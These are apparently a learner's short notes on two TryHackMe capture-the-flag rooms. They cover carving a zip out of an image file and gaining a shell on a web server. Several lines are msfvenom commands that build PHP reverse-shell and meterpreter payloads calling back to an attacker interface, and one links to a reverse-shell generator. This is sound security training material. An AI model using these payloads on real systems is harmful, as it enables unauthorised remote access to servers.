# R

* Remember for web/general/security
* .todo: metasploit dns sqlmap
* .todo: windows Linux web shell
* web general | terminology may have to be extracted

## Overconfidence

--- https://tryhackme.com/room/agentsudoctf

* `echo {A..Z} | tr ' ' '\n'`
* `echo {0..9} | tr ' ' '\n'`
* `dd bs=34562 skip=1 if=cutie.png.zip of=agent.zip`. The file was an image followed by a zip. (https://unix.stackexchange.com/questions/6852/best-way-to-remove-bytes-from-the-start-of-a-file)
* `7z x agent.zip` (https://stackoverflow.com/questions/28383199/error-while-unzipping-a-file-in-shell-script-need-pk-compat-v5-1-can-do-v4)
* Reverse search images (note below xxx)
* python2 / python3
* writeups

--- https://tryhackme.com/room/rrootme

* `gobuster -t 50`
* `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
* exploit/multi/handler
* `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
* `msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4455 -o revshell3.php5`
* `sudo bash -c "id"`
* https://www.revshells.com/
* TL;DR. Nothing explained to improve the shell worked. Could not run python commands, the shell was crashing. Had to use a web shell to run python commands. The meterpreter didn't work "as expected". The reverse tcp worked but it wasn't a good experience.
* writeups